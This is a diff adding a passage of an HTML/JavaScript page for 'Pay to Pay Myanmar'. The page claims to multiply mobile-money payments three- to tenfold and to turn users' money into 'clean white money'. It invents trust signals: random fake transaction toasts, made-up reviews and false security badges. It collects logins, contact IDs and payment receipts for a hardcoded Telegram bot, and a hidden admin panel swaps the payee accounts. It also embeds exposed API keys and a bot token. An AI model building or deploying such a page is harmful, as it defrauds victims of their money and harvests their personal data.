@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pay to Pay Myanmar - Professional Exchange</title>
+    <link href="https://fonts.googleapis.com/css2?family=Pyidaungsu:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #1e3799;
+            --secondary: #4a69bd;
+            --accent: #f8c291;
+            --success: #079992;
+            --bg: #f1f2f6;
+            --danger: #eb4d4b;
+            --warning: #f39c12;
+            --card-shadow: 0 10px 30px rgba(0,0,0,0.12);
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body { font-family: 'Pyidaungsu', sans-serif; background: var(--bg); margin: 0; padding: 0; color: #333; overflow-x: hidden; }
+        
+        /* --- Enhanced Auth Styles --- */
+        #auth-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+
+        .auth-card {
+            background: white;
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: var(--card-shadow);
+            width: 100%;
+            max-width: 420px;
+            transition: var(--transition);
+        }
+
+        .auth-card:hover { transform: translateY(-5px); }
+
+        .auth-card h2 { 
+            color: var(--primary); 
+            text-align: center; 
+            margin-bottom: 25px; 
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .auth-tabs { 
+            display: flex; 
+            margin-bottom: 30px; 
+            background: #f1f2f6;
+            border-radius: 12px;
+            padding: 5px;
+        }
+
+        .tab { 
+            flex: 1; 
+            text-align: center; 
+            padding: 12px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            color: #777; 
+            transition: var(--transition);
+            border-radius: 10px;
+        }
+
+        .tab.active { 
+            background: white;
+            color: var(--primary); 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        /* Input Styling */
+        .input-group { margin-bottom: 20px; }
+        
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: 600; 
+            font-size: 14px; 
+            color: #555; 
+            transition: var(--transition);
+        }
+
+        input, select { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border: 2px solid #edf2f7; 
+            border-radius: 12px; 
+            font-size: 15px; 
+            box-sizing: border-box;
+            transition: var(--transition);
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--secondary);
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(74, 105, 189, 0.1);
+        }
+
+        /* Buttons with Animation */
+        .main-btn { 
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            width: 100%; 
+            border-radius: 12px; 
+            font-weight: bold; 
+            font-size: 16px; 
+            cursor: pointer; 
+            transition: var(--transition);
+            box-shadow: 0 4px 15px rgba(30, 55, 153, 0.3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .main-btn:hover {
+            filter: brightness(1.1);
+            transform: scale(1.02);
+            box-shadow: 0 6px 20px rgba(30, 55, 153, 0.4);
+        }
+
+        .main-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* --- Main Content Styles --- */
+        #main-content { display: none; }
+
+        .header { 
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white; 
+            padding: 50px 20px; 
+            text-align: center; 
+            border-radius: 0 0 30px 30px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            position: relative;
+        }
+
+        /* History Icon Styling */
+        .history-icon {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 24px;
+            color: white;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .history-icon:hover { transform: scale(1.1); opacity: 0.8; }
+        
+        .container { padding: 15px; max-width: 500px; margin: auto; margin-top: -30px; }
+        
+        .card {
+            background: #ffffff;
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--card-shadow);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        /* History Modal Styling */
+        #history-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: white;
+            width: 90%;
+            max-width: 450px;
+            margin: 50px auto;
+            border-radius: 20px;
+            padding: 20px;
+            position: relative;
+            max-height: 80vh;
+            overflow-y: auto;
+            animation: fadeIn 0.3s;
+        }
+
+        /* History Items Style */
+        .history-list-container { margin-top: 15px; }
+        .history-item { 
+            background: #f8fafc; 
+            padding: 15px; 
+            border-radius: 12px; 
+            margin-bottom: 10px; 
+            border-left: 5px solid var(--primary);
+            font-size: 14px;
+        }
+        .h-status-pending { color: var(--warning); font-weight: bold; }
+        .h-status-completed { color: var(--success); font-weight: bold; }
+        .h-status-rejected { color: var(--danger); font-weight: bold; }
+
+        /* Moved Status Card Style */
+        .status-container { display: block; background: #fff; border-left: 6px solid var(--warning); padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 10px; }
+        .status-title { font-weight: bold; color: var(--primary); display: flex; justify-content: space-between; align-items: center; }
+        .status-bar { height: 8px; background: #eee; border-radius: 10px; overflow: hidden; margin: 10px 0; }
+        .status-progress { height: 100%; width: 45%; background: var(--warning); transition: 0.6s ease-in-out; }
+
+        .info-toggle {
+            background: #fff3cd; color: #856404; padding: 15px; border-radius: 15px;
+            display: flex; align-items: center; cursor: pointer; border: 1px solid #ffeeba; margin-bottom: 20px;
+        }
+        .info-content {
+            display: none; background: white; padding: 20px; border-radius: 15px; margin-bottom: 20px;
+            line-height: 1.7; border-top: 5px solid var(--warning); box-shadow: var(--card-shadow);
+        }
+        .info-content.active { display: block; animation: fadeIn 0.4s; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .trust-section { background: #eef2ff; border-left: 5px solid var(--primary); }
+        .trust-section h4 { margin-top: 0; color: var(--primary); display: flex; align-items: center; gap: 10px; }
+
+        .payment-methods { display: flex; justify-content: space-around; gap: 15px; margin: 20px 0; }
+        .method { 
+            flex: 1; border: 2px solid #eee; border-radius: 18px; padding: 15px; cursor: pointer; 
+            transition: 0.3s; text-align: center; background: white;
+        }
+        .method img { width: 50px; height: 50px; border-radius: 12px; margin-bottom: 8px; }
+        .method.active { border-color: var(--primary); background: #f0f4ff; transform: translateY(-5px); }
+
+        .payment-info { display: none; border-left: 6px solid var(--success); }
+        .payment-info.show { display: block; }
+
+        .file-input-wrapper {
+            border: 2px dashed #cbd5e0; padding: 25px; border-radius: 15px;
+            text-align: center; cursor: pointer; background: #f8fafc;
+        }
+        #receipt-preview { max-width: 100%; margin-top: 15px; border-radius: 10px; display: none; }
+
+        .confirm-btn { background: var(--success); color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
+        .confirm-btn:hover { opacity: 0.9; }
+
+        .admin-panel { display: none; background: #1a202c; color: white; padding: 25px; border-radius: 20px; margin-top: 20px; border: 2px solid gold; }
+        .admin-panel input { background: #2d3748; border: none; color: white; margin-bottom: 10px;}
+        .admin-btn-group { display: flex; gap: 10px; margin-top: 10px; }
+        .reject-btn { background: var(--danger); flex: 1; }
+        .approve-btn { background: var(--success); flex: 1; }
+        
+        .copy-btn { float: right; color: var(--primary); font-size: 12px; cursor: pointer; text-decoration: underline; }
+
+        /* --- NEW: Trust Building Styles --- */
+        #live-toast {
+            position: fixed; bottom: 20px; left: 20px; background: white;
+            padding: 12px 20px; border-radius: 50px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            display: none; align-items: center; gap: 10px; z-index: 9999;
+            border-left: 5px solid var(--success); animation: slideRight 0.5s;
+        }
+        @keyframes slideRight { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        .review-card { background: #fff; padding: 15px; border-radius: 15px; border: 1px solid #eee; margin-bottom: 10px; }
+        .star-rating { color: #f1c40f; font-size: 12px; margin-bottom: 5px; }
+        
+        .footer-badges { text-align: center; padding: 20px; opacity: 0.6; }
+        .footer-badges img { height: 25px; margin: 0 10px; filter: grayscale(100%); transition: 0.3s; }
+        .footer-badges img:hover { filter: grayscale(0%); opacity: 1; }
+
+        .guarantee-box { 
+            background: #d1fae5; border: 2px dashed var(--success); 
+            padding: 15px; border-radius: 15px; color: #065f46; 
+            margin-top: 15px; font-size: 13px; text-align: center;
+        }
+        
+        .verified-badge { color: #3498db; margin-left: 5px; font-size: 14px; }
+
+        /* Dynamic Calculator Styles */
+        .calc-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 18px;
+            margin-bottom: 20px;
+            box-shadow: var(--card-shadow);
+            border-top: 5px solid var(--primary);
+        }
+        .calc-box {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .calc-input-wrapper {
+            position: relative;
+        }
+        .calc-input-wrapper span {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: bold;
+            color: var(--primary);
+        }
+        .result-box {
+            background: #f0f4ff;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px dashed var(--primary);
+        }
+        .result-amount {
+            display: block;
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
+        /* Animated Step Timeline */
+        .process-timeline {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+            position: relative;
+        }
+        .process-timeline::before {
+            content: '';
+            position: absolute;
+            top: 25px;
+            left: 10%;
+            width: 80%;
+            height: 3px;
+            background: #ddd;
+            z-index: 1;
+        }
+        .step {
+            width: 30%;
+            text-align: center;
+            z-index: 2;
+            position: relative;
+        }
+        .step-icon {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border: 3px solid #ddd;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-size: 18px;
+            color: #999;
+            transition: var(--transition);
+        }
+        .step.active .step-icon {
+            border-color: var(--success);
+            color: var(--success);
+            box-shadow: 0 0 15px rgba(7, 153, 146, 0.3);
+            animation: pulse 2s infinite;
+        }
+        .step.processing .step-icon {
+            border-color: var(--warning);
+            color: var(--warning);
+        }
+        .step p { font-size: 11px; font-weight: bold; margin: 0; color: #777; }
+        .step.active p { color: var(--success); }
+
+        /* Admin User List Styles */
+        .admin-user-card {
+            background: #2d3748;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #4a5568;
+        }
+        .admin-user-info { font-size: 13px; line-height: 1.5; margin-bottom: 10px; }
+        .admin-user-info b { color: gold; }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+    </style>
+</head>
+<body>
+
+<!-- Live Transaction Toast -->
+<div id="live-toast">
+    <div style="background: var(--success); color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+        <i class="fas fa-check"></i>
+    </div>
+    <div>
+        <div id="toast-msg" style="font-size: 12px; font-weight: bold; color: #333;">09***၁၂၃ မှ ၅ သောင်းလဲလှယ်မှု အောင်မြင်သည်။</div>
+        <div style="font-size: 10px; color: #888;">Just now via Secure Gateway</div>
+    </div>
+</div>
+
+<div id="history-modal">
+    <div class="modal-content">
+        <h3 style="color:var(--primary); text-align:center;"><i class="fas fa-history"></i> လဲလှယ်မှုမှတ်တမ်း (ရက် ၃၀)</h3>
+        
+        <!-- Animated Process Timeline -->
+        <div class="process-timeline" id="status-timeline">
+            <div class="step" id="step-1">
+                <div class="step-icon"><i class="fas fa-file-invoice-dollar"></i></div>
+                <p>လွှဲပြီး</p>
+            </div>
+            <div class="step" id="step-2">
+                <div class="step-icon"><i class="fas fa-user-check"></i></div>
+                <p>စစ်ဆေးနေ</p>
+            </div>
+            <div class="step" id="step-3">
+                <div class="step-icon"><i class="fas fa-coins"></i></div>
+                <p>ငွေဝင်ပြီ</p>
+            </div>
+        </div>
+
+        <p style="text-align: center; font-size: 12px; color: #666; margin-top: -10px;">မှတ်တမ်းများကို ရက် ၃၀ အထိသာ စနစ်တကျသိမ်းဆည်းပေးပါသည်။</p>
+        <hr>
+        
+        <div id="active-status-box" class="status-container">
+            <div class="status-title">
+                <span><i class="fas fa-sync fa-spin"></i> လက်ရှိအခြေအနေ</span>
+                <span id="status-label" style="color: var(--warning);">Pending</span>
+            </div>
+            <div class="status-bar">
+                <div id="status-progress" class="status-progress"></div>
+            </div>
+            <p style="font-size: 12px; color: #666; margin: 0;" id="status-desc">လဲလှယ်မှုပြုလုပ်နေပါသည် လဲလှယ်မှုမှန်ကန်ကြောင်းစစ်ဆေးနေပါသည်</p>
+        </div>
+
+        <div id="history-list" class="history-list-container">
+            <p style="text-align: center; color: #999;">မှတ်တမ်းများမရှိသေးပါ။</p>
+        </div>
+
+        <button class="main-btn" style="margin-top:20px;" onclick="closeHistory()">ပိတ်မည်</button>
+    </div>
+</div>
+
+<div id="auth-container">
+    <div class="auth-card">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <img src="https://i.ibb.co/JWmddJQL/logo.png" width="80" style="filter: drop-shadow(0 5px 10px rgba(0,0,0,0.1));">
+        </div>
+        <h2 id="auth-title">Welcome Back</h2>
+        
+        <div class="auth-tabs">
+            <div class="tab active" id="login-tab" onclick="switchAuth('login')">Login</div>
+            <div class="tab" id="signup-tab" onclick="switchAuth('signup')">Sign Up</div>
+        </div>
+
+        <div id="auth-form">
+            <div id="signup-fields" style="display: none;">
+                <div class="input-group">
+                    <label><i class="fas fa-user-circle"></i> Full Name</label>
+                    <input type="text" id="reg-name" placeholder="သင့်နာမည်အပြည့်အစုံ">
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label><i class="fas fa-phone-volume"></i> Phone Number</label>
+                <input type="number" id="auth-phone" placeholder="09xxxxxxxxx">
+            </div>
+
+            <div class="input-group">
+                <label><i class="fas fa-shield-alt"></i> Password</label>
+                <input type="password" id="auth-pass" placeholder="Password အနည်းဆုံး ၆ လုံး">
+            </div>
+
+            <button class="main-btn" id="auth-btn" onclick="handleAuth()">
+                <span id="btn-text">Login Now</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+        
+        <div style="text-align: center; margin-top: 20px; font-size: 11px; color: #999;">
+            <i class="fas fa-lock"></i> Secured by End-to-End Encryption
+        </div>
+    </div>
+</div>
+
+<div id="main-content">
+    <div class="header">
+        <i class="fas fa-history history-icon" onclick="openHistory()"></i>
+        <img src="https://i.ibb.co/JWmddJQL/logo.png" width="70" style="border-radius: 15px; margin-bottom: 10px;">
+        <h2>PAY TO PAY <i class="fas fa-check-circle verified-badge"></i></h2>
+        <p>Professional Myanmar Money Exchange</p>
+        <div style="margin-top: 15px; font-size: 12px; background: rgba(255,255,255,0.2); display: inline-block; padding: 5px 15px; border-radius: 20px;" id="logged-user">User: -</div>
+    </div>
+
+    <div class="container">
+        <!-- Dynamic Exchange Calculator -->
+        <div class="calc-container">
+            <h4 style="margin:0 0 15px 0; color:var(--primary); text-align:center;"><i class="fas fa-calculator"></i> Real-time Calculator</h4>
+            <div class="calc-box">
+                <label>သင်ပေးပို့မည့် ပမာဏ</label>
+                <div class="calc-input-wrapper">
+                    <input type="number" id="input-pay-amount" placeholder="0" oninput="calculateExchange()">
+                    <span>MMK</span>
+                </div>
+            </div>
+            <div class="result-box">
+                <small>သင်ပြန်ရရှိမည့် ပမာဏ</small>
+                <span class="result-amount" id="result-receive-amount">0</span>
+                <small>MMK (Cash Out Rate Included)</small>
+            </div>
+        </div>
+
+        <div class="info-toggle" onclick="toggleInfo()">
+            <i class="fas fa-shield-heart" style="font-size: 20px; margin-right: 15px; color: var(--success);"></i>
+            <div>
+                <strong>Pay to Pay လုံခြုံရေးဆိုင်ရာ မူဝါဒ</strong>
+                <small style="display: block; opacity: 0.8;">ယုံကြည်စိတ်ချစွာ လဲလှယ်နိုင်ရန်</small>
+            </div>
+        </div>
+
+        <div id="p2p-info" class="info-content">
+            <h3 style="color:var(--primary); margin-top: 0;"><i class="fas fa-user-shield"></i> လုံခြုံစိတ်ချရသော ငွေကြေးဝန်ဆောင်မှု</h3>
+            <p>မြန်မာနိုင်ငံတွင် လက်ရှိဖြစ်ပေါ်နေသော ငွေကြေးစီးဆင်းမှုစနစ်များ၌ မသန့်ရှင်းသော လမ်းကြောင်းများမှ ရရှိလာသော ငွေကြေးများကြောင့် သာမန်ပြည်သူများ၏ ဘဏ်အကောင့်များ ပိတ်သိမ်းခံရခြင်းမှ ကာကွယ်ရန် ကျွန်ုပ်တို့မှ တာဝန်ယူပါသည်။</p>
+            <p><strong>ကျွန်ုပ်တို့၏ ရည်ရွယ်ချက်မှာ-</strong> အသုံးပြုသူများ၏ ငွေကြေးစီးဆင်းမှု လုံခြုံစိတ်ချရစေရန် စနစ်တကျ စစ်ဆေးပေးခြင်း (Secure Flow Management) ကို အခြေခံကျကျ ကိုင်တွယ်ဖြေရှင်းပေးရန် ဖြစ်ပါသည်။ ကျွန်ုပ်တို့သည် အသုံးပြုသူများ၏ လဲလှယ်မှုတိုင်းကို စနစ်တကျ စစ်ဆေးပြီး၊ တရားဝင်သော ငွေဖြူများအဖြစ်သာ လည်ပတ်နိုင်ရန် လမ်းကြောင်းဖော်ဆောင်ပေးပါသည်။</p>
+            
+            <div class="guarantee-box">
+                <i class="fas fa-handshake"></i> <b>100% Guarantee:</b> လဲလှယ်မှု ကြာချိန်သည် ၅ မိနစ်မှ ၁၅ မိနစ်အတွင်းသာ ကြာမြင့်မည်။ အကယ်၍ ၁ နာရီထက် ကျော်လွန်ပါက ငွေပမာဏကို ၁၀၀% အပြည့်အဝ တာဝန်ယူ ပြန်ပေးမည် ဖြစ်ပါသည်။
+            </div>
+            
+            <button class="main-btn" style="padding: 10px; margin-top: 15px;" onclick="toggleInfo()">ဖတ်ရှုပြီးပါပြီ</button>
+        </div>
+
+        <div class="card trust-section">
+            <h4><i class="fas fa-fingerprint"></i> ငွေကြေးစီးဆင်းမှု လုံခြုံစိတ်ချရစေရန် စစ်ဆေးခြင်း</h4>
+            <p style="margin: 0; line-height: 1.6; font-size: 13.5px;">ကျွန်ုပ်တို့သည် သင့်ငွေကြေးများကို သန့်ရှင်းသော ငွေဖြူများအဖြစ် အသွင်ပြောင်းပေးရန်နှင့် ဘဏ်အကောင့်များ ပိတ်သိမ်းခံရမှုမရှိစေရန် တာဝန်ယူ စောင့်ရှောက်ပေးပါသည်။</p>
+        </div>
+
+        <div class="card">
+            <h4 style="margin-top:0; color:var(--primary);"><i class="fas fa-comment-dots"></i> သုံးစွဲသူများ၏ မှက်ချက်များ</h4>
+            <div class="review-card">
+                <div class="star-rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                <div style="font-size: 13px; font-weight: bold;">Ko Aung Kyaw</div>
+                <div style="font-size: 12px; color: #666;">"ငွေလွှဲတာ အရမ်းမြန်တယ်ဗျ။ ၅ မိနစ်တောင်မကြာဘူး ငွေဝင်လာတယ်။ တကယ့်ကို ယုံကြည်ရပါတယ်။"</div>
+            </div>
+            <div class="review-card">
+                <div class="star-rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                <div style="font-size: 13px; font-weight: bold;">Ma Sandar</div>
+                <div style="font-size: 12px; color: #666;">"Customer Service ကလည်း အပြောအဆို ယဉ်ကျေးပါတယ်။ အမြဲ ဒီကပဲ လဲဖြစ်တော့မယ်။"</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h4 style="margin-top:0; color:var(--primary);"><i class="fas fa-headset"></i> ဆက်သွယ်ရန် အချက်အလက်</h4>
+            <p style="font-size: 12px; color: #666; margin-bottom: 15px;">လဲလှယ်မှုနှင့် ပတ်သက်၍ အမြန်ဆုံး ဆက်သွယ်နိုင်ရန် ဖြည့်စွက်ပေးပါ။</p>
+            
+            <label><i class="fab fa-telegram" style="color:#0088cc;"></i> Telegram Username / Phone</label>
+            <input type="text" id="contact-telegram" placeholder="@username or 09...">
+            
+            <label><i class="fas fa-phone-alt" style="color:#25d366;"></i> Viber Number</label>
+            <input type="number" id="contact-viber" placeholder="09xxxxxxxxx">
+            
+            <label><i class="fab fa-tiktok"></i> TikTok Username</label>
+            <input type="text" id="contact-tiktok" placeholder="Tiktok ID">
+            
+            <button class="confirm-btn" onclick="sendContactData()"><i class="fas fa-save"></i> အချက်အလက်အတည်ပြုမည်</button>
+        </div>
+
+        <div class="card" style="text-align:center;">
+            <img src="https://i.ibb.co/9mbw7qwY/cs-photo.jpg" style="width:70px; height:70px; border-radius:50%; border:3px solid var(--primary); margin-bottom:10px;">
+            <a href="https://t.me/Sarina233396" class="cs-button" style="text-decoration:none; display:flex; align-items:center; justify-content:center; gap:10px; background:#0088cc; color:white; padding:12px; border-radius:12px; font-weight:bold;">
+                <i class="fab fa-telegram-plane"></i> Contact Live Support
+            </a>
+        </div>
+
+        <div class="payment-methods">
+            <div class="method" id="m-kpay" onclick="selectMethod('kpay')">
+                <img src="https://i.ibb.co/C5qZ7m3Y/kpay.png"><span>KPay</span>
+            </div>
+            <div class="method" id="m-wave" onclick="selectMethod('wave')">
+                <img src="https://i.ibb.co/4n6Nwd3Z/wave.png"><span>Wave Money</span>
+            </div>
+        </div>
+
+        <div id="kpay-info" class="card payment-info">
+            <p><strong>Merchant Name:</strong> <span id="kpay-name">Loading...</span></p>
+            <p><strong>Acc Number:</strong> <span id="kpay-num">Loading...</span> <span class="copy-btn" onclick="copyText('kpay-num')">Copy <i class="fas fa-copy"></i></span></p>
+        </div>
+        <div id="wave-info" class="card payment-info">
+            <p><strong>Merchant Name:</strong> <span id="wave-name">Loading...</span></p>
+            <p><strong>Acc Number:</strong> <span id="wave-num">Loading...</span> <span class="copy-btn" onclick="copyText('wave-num')">Copy <i class="fas fa-copy"></i></span></p>
+        </div>
+
+        <div class="card">
+            <label><i class="fas fa-exchange-alt"></i> လဲလှယ်မှု အမျိုးအစား ရွေးချယ်ပါ</label>
+            <select id="amount-select" onchange="syncCalculatorFromSelect()">
+                <optgroup label="အသေးစားလဲလှယ်မှု (Max 2 per month)" id="group-small">
+                    <option value="1k-3k">1,000 MMK -> 3,000 MMK</option>
+                    <option value="3k-6k">3,000 MMK -> 6,000 MMK</option>
+                    <option value="5k-10k">5,000 MMK -> 10,000 MMK</option>
+                    <option value="50k-200k">50,000 MMK -> 200,000 MMK</option>
+                </optgroup>
+                <optgroup label="အလတ်စားလဲလှယ်မှု (Max 1 per month)" id="group-medium">
+                    <option value="100k-1000k">100,000 MMK -> 1,000,000 MMK</option>
+                    <option value="300k-1500k">300,000 MMK -> 1,500,000 MMK</option>
+                    <option value="500k-2500k">50,000 MMK -> 2,500,000 MMK</option>
+                </optgroup>
+                <optgroup label="အကြီးစားလဲလှယ်မှု (Max 1 per month)" id="group-large">
+                    <option value="1000k-10000k">1,000,000 MMK -> 10,000,000 MMK</option>
+                    <option value="5000k-50000k">5,000,000 MMK -> 50,000,000 MMK</option>
+                </optgroup>
+            </select>
+
+            <label><i class="fas fa-user-tag"></i> သင့် Pay အမည်</label>
+            <input type="text" id="user-name" placeholder="Kpay/Wave အမည်">
+
+            <label id="user-receive-label"><i class="fas fa-mobile-alt"></i> သင်ငွေပြန်လက်ခံမည့် ဖုန်းနံပါတ်</label>
+            <input type="number" id="user-phone-receive" placeholder="09xxxxxxxxx">
+
+            <label><i class="fas fa-receipt"></i> Transaction ID (နောက်ဆုံး ၆ လုံး)</label>
+            <input type="text" id="tran-id" placeholder="ပြေစာမှ နံပါတ်">
+
+            <label><i class="fas fa-camera-retro"></i> ငွေလွှဲပြေစာ (Screenshot)</label>
+            <div class="file-input-wrapper" onclick="document.getElementById('file-upload').click()">
+                <i class="fas fa-cloud-upload-alt" style="font-size:30px; color:var(--secondary);"></i>
+                <p id="file-status" style="margin:5px 0 0 0; font-size:13px;">နှိပ်၍ ပုံရွေးချယ်ပါ</p>
+                <input type="file" id="file-upload" style="display:none" accept="image/*" onchange="previewImage(this)">
+                <img id="receipt-preview">
+            </div>
+
+            <button class="main-btn" id="submit-btn" style="margin-top:20px;" onclick="sendToTelegram()">
+                <i class="fas fa-paper-plane"></i> လဲလှယ်မှု အတည်ပြုမည်
+            </button>
+            <button class="main-btn" style="background: #e2e8f0; margin-top: 12px; color: #4a5568; box-shadow: none;" onclick="logout()">Logout</button>
+        </div>
+
+        <div class="footer-badges">
+            <img src="https://i.ibb.co/C5qZ7m3Y/kpay.png" alt="KPay">
+            <img src="https://i.ibb.co/4n6Nwd3Z/wave.png" alt="Wave">
+            <div style="margin-top: 10px; font-size: 10px;">
+                <i class="fas fa-shield-alt"></i> PCI-DSS Compliant | SSL Secure Connection
+            </div>
+        </div>
+
+        <div id="admin-trigger" style="height:40px;" onclick="adminClick()"></div>
+        <div id="admin-panel" class="admin-panel">
+            <h3 style="color: gold;"><i class="fas fa-user-shield"></i> Admin Control Center</h3>
+            
+            <label style="color: #ccc;">Admin Password</label>
+            <input type="password" id="admin-pass" placeholder="Enter Password to Unlock">
+            
+            <hr style="border: 0.5px solid #444; margin: 20px 0;">
+
+            <h4 style="color: #f8c291; margin-bottom: 10px;">Pending Requests</h4>
+            <div id="admin-user-list">
+                <p style="color: #888; font-size: 12px;">No active requests.</p>
+            </div>
+            
+            <hr style="border: 0.5px solid #444; margin: 20px 0;">
+            <label style="color: #ccc;">Bank Settings</label>
+            <input type="text" id="new-kpay-name-input" placeholder="New Kpay Name">
+            <input type="text" id="new-kpay-num-input" placeholder="New Kpay Number">
+            <input type="text" id="new-wave-name-input" placeholder="New Wave Name">
+            <input type="text" id="new-wave-num-input" placeholder="New Wave Number">
+            <button class="confirm-btn" style="background:var(--primary);" onclick="saveSettings()">Update Payments Data</button>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot, collection, query, where, arrayUnion } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCIFugD25cAWqpdpOcUBk4cn8gDXvBdtZs",
+  authDomain: "paytopay-mm.firebaseapp.com",
+  databaseURL: "https://paytopay-mm-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "paytopay-mm",
+  storageBucket: "paytopay-mm.firebasestorage.app",
+  messagingSenderId: "242432384889",
+  appId: "1:242432384889:web:5b04b5a1c904bac3c019a8"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const BOT_TOKEN = "8689448201:AAGWjBhPY2UFrc9rODN3jROUcuwYyYXcmKU";
+const CHAT_ID = "7184126683";
+let currentUser = null;
+let selectedFile = null;
+let selectedPayment = "kpay";
+
+// Dynamic Calculator Logic
+window.calculateExchange = function() {
+    const inputAmount = parseFloat(document.getElementById('input-pay-amount').value) || 0;
+    const resultDisplay = document.getElementById('result-receive-amount');
+    
+    let multiplier = 3; 
+    if (inputAmount >= 100000) multiplier = 10;
+    if (inputAmount >= 1000000) multiplier = 10;
+
+    const finalResult = inputAmount * multiplier;
+    resultDisplay.innerText = finalResult.toLocaleString();
+}
+
+window.syncCalculatorFromSelect = function() {
+    const val = document.getElementById('amount-select').value;
+    let cleanInput = 0;
+    if(val === "1k-3k") cleanInput = 1000;
+    else if(val === "3k-6k") cleanInput = 3000;
+    else if(val === "5k-10k") cleanInput = 5000;
+    else if(val === "50k-200k") cleanInput = 50000;
+    else if(val === "100k-1000k") cleanInput = 100000;
+    else if(val === "300k-1500k") cleanInput = 300000;
+    else if(val === "500k-2500k") cleanInput = 500000;
+    else if(val === "1000k-10000k") cleanInput = 1000000;
+    else if(val === "5000k-50000k") cleanInput = 5000000;
+
+    document.getElementById('input-pay-amount').value = cleanInput;
+    calculateExchange();
+}
+
+const toastMsgs = [
+    "09***455 မှ ၁ သောင်း လဲလှယ်မှု အောင်မြင်သည်။",
+    "09***921 မှ ၅ ထောင် လဲလှယ်မှု အောင်မြင်သည်။",
+    "09***118 မှ ၂ သိန်း လဲလှယ်မှု အောင်မြင်သည်။",
+    "09***002 မှ ၁၀ သိန်း လဲလှယ်မှု အောင်မြင်သည်။",
+    "၀၉***၇၇၂ မှ ၅ သောင်း လဲလှယ်မှု အောင်မြင်သည်။"
+];
+
+function showToast() {
+    const toast = document.getElementById('live-toast');
+    const msg = document.getElementById('toast-msg');
+    msg.innerText = toastMsgs[Math.floor(Math.random() * toastMsgs.length)];
+    toast.style.display = 'flex';
+    setTimeout(() => { toast.style.display = 'none'; }, 4000);
+}
+setInterval(showToast, 12000); 
+
+onSnapshot(doc(db, "settings", "payment_info"), (doc) => {
+    if (doc.exists()) {
+        const data = doc.data();
+        document.getElementById('kpay-name').innerText = data.kpayName || "Admin";
+        document.getElementById('kpay-num').innerText = data.kpayNum || "09xxxxxxx";
+        document.getElementById('wave-name').innerText = data.waveName || "Admin";
+        document.getElementById('wave-num').innerText = data.waveNum || "09xxxxxxx";
+    }
+});
+
+// Admin Live Requests Listener
+function listenToPendingRequests() {
+    const q = query(collection(db, "users"), where("status", "==", "pending"));
